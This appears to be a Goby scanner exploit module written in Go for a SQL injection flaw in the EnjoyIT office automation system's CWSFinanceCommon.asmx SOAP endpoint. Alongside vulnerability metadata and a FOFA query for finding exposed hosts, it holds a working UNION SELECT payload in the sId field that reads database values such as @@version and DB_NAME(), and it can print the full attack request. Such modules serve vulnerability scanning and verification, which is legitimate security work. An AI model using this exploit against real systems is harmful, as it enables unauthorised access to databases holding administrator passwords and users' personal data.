package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx SQL Injection Vulnerability",
    "Description": "<p>enjoyit-office-automation-management-information-system not only covers the fine management of basic businesses such as procurement, logistics, operation, finance and membership of physical retail enterprises, but also takes business mobility, operation dataization and channel diversification as the principle of information construction on the basis of the core business system, so as to achieve customer-oriented and enterprise-oriented Mobile integrated solutions for employees and partners (suppliers, merchants) in the industry. Combine all-channel China and Taiwan to help retail enterprises unify online and offline channels, and realize the integrated management of online and offline elements such as commodities, inventory, prices, marketing, membership, orders and payments. Help enterprises create a new model under new retail. </p><p>enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities, attackers can obtain information in the database (for example, management In addition to the background password and the user's personal information of the site, even in the case of high permissions, a Trojan horse can be written to the server to further obtain the permissions of the server system.</p>",
    "Product": "enjoyit-office-automation-management-information-system",
    "Homepage": "https://www.enjoyit.com.cn/",
    "DisclosureDate": "2024-07-04",
    "PostTime": "2024-07-04",
    "Author": "songzhenhong@baimaohui.net",
    "FofaQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "GobyQuery": "body=\"CheckSilverlightInstalled\" && body=\"AllowHtmlPopupwindow\"",
    "Level": "1",
    "Impact": "<p>enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities, attackers can obtain information in the database (for example, management In addition to the background password and the user's personal information of the site, even in the case of high permissions, a Trojan horse can be written to the server to further obtain the permissions of the server system.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:<a href=\"https://www.enjoyit.com.cn/\">https://www.enjoyit.com.cn/</a> </p><p>2. Deploy the Web application firewall to monitor the database operation.  </p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "select",
            "value": "@@version,DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "昂捷办公自动化管理信息系统 /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx SQL 注入漏洞",
            "Product": "昂捷办公自动化管理信息系统",
            "Description": "<p>昂捷办公自动化管理信息系统不仅涵盖了对实体零售企业采购、物流、营运、财务、会员等基础性业务的精细化管理，同时以核心业务系统为基础，将业务移动化、运营数据化、渠道多样化为信息化建设原则，实现面向顾客、企业内部员工、伙伴（供应商、商户）的移动端一体化解决方案。结合全渠道中台助力零售企业统一线上、线下各渠道，实现各渠道商品、库存、价格、营销、会员、订单、支付等线上线下各要素的一体化管理。助力企业打造新零售下的新模式。</p><p>昂捷办公自动化管理信息系统 /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.enjoyit.com.cn/\">https://www.enjoyit.com.cn/</a>&nbsp;</p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>昂捷办公自动化管理信息系统 /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx SQL Injection Vulnerability",
            "Product": "enjoyit-office-automation-management-information-system",
            "Description": "<p>enjoyit-office-automation-management-information-system not only covers the fine management of basic businesses such as procurement, logistics, operation, finance and membership of physical retail enterprises, but also takes business mobility, operation dataization and channel diversification as the principle of information construction on the basis of the core business system, so as to achieve customer-oriented and enterprise-oriented Mobile integrated solutions for employees and partners (suppliers, merchants) in the industry. Combine all-channel China and Taiwan to help retail enterprises unify online and offline channels, and realize the integrated management of online and offline elements such as commodities, inventory, prices, marketing, membership, orders and payments. Help enterprises create a new model under new retail.&nbsp;</p><p>enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities, attackers can obtain information in the database (for example, management In addition to the background password and the user's personal information of the site, even in the case of high permissions, a Trojan horse can be written to the server to further obtain the permissions of the server system.<br></p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:<a href=\"https://www.enjoyit.com.cn/\">https://www.enjoyit.com.cn/</a>&nbsp;</p><p>2. Deploy the Web application firewall to monitor the database operation.&nbsp;&nbsp;</p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>enjoyit-office-automation-management-information-system /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities, attackers can obtain information in the database (for example, management In addition to the background password and the user's personal information of the site, even in the case of high permissions, a Trojan horse can be written to the server to further obtain the permissions of the server system.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10965"
}`

	sendPayloadiwtmaxqp := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "text/xml; charset=utf-8")
		payloadConfig.Data = `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOSpById xmlns="http://tempuri.org/">
<sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select ` + sql + `),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- YQmj</sId>
</GetOSpById>
</soap:Body>
</soap:Envelope>`

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "<c_store_id>") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadiwtmaxqp
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `@@version`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadiwtmaxqp
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `(?s)<c_store_id>(.*?)</c_store_id>`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, "@@version")
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
Content-Type: text/xml; charset=utf-8
Content-Length: 480

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOSpById xmlns="http://tempuri.org/">
<sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select ` + sql + `),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- YQmj</sId>
</GetOSpById>
</soap:Body>
</soap:Envelope>`
			}
			return expResult
		},
	))
}
